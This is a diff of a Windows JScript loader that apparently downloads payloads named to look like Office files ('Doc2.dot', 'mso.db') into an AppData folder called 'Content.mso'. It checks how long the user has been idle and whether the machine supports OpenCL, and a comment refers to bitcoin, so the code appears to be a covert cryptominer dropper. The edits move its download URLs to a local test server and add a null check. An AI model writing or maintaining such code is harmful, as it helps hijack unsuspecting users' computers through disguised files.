@@ -23,7 +23,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadyConfig ={ name: "Doc2.dot",url:"http://127.0.0.1/config/Doc2.dot" }
+var __destReadyConfig ={ name: "Doc2.dot",url:"http://127.0.0.1:8080/config/Doc2.dot" }
 //最重要的配置文件
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
@@ -40,7 +40,7 @@ if(__DEBUG)
 	__idletime=1000*15
 else if(__IsSupportOpencl)
 	__idletime=1000*30
-//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc
+//var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1:8080/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" } 曾的btc
 /*
 var __installReadys = [
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
@@ -560,7 +560,7 @@ function filter_innertask.prototype.run(pipe){
 			log("module name "+mod.name+" onDonCallback");		////innertask 完后就是userfinedtask 最后一步了
 			if(!__startup){
 				var _userdefined_module = new module("userdefined");		
-				for(i=0;i<___gconfig.userdefinedlist.length;i++){
+				for(i=0;___gconfig.userdefinedlist && i<___gconfig.userdefinedlist.length;i++){
 					var userdefined = ___gconfig.userdefinedlist[i]
 					if(userdefined.invalidcondition && userdefined.invalidcondition()){						
 					}else{
